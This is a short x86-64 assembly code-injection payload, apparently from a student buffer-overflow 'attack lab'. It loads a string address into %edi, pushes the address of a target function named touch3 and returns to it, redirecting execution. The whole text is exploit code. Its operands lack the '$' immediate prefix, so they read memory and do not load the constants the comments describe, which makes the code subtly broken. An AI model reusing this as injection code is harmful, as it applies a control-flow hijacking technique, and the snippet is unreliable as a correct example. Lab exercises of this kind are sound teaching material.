	movl 0x5561dca8,%edi # put the string input into the test stack, return address of test + 8
	pushq 0x4018fa # push the address of touch3 into the stack
	retq
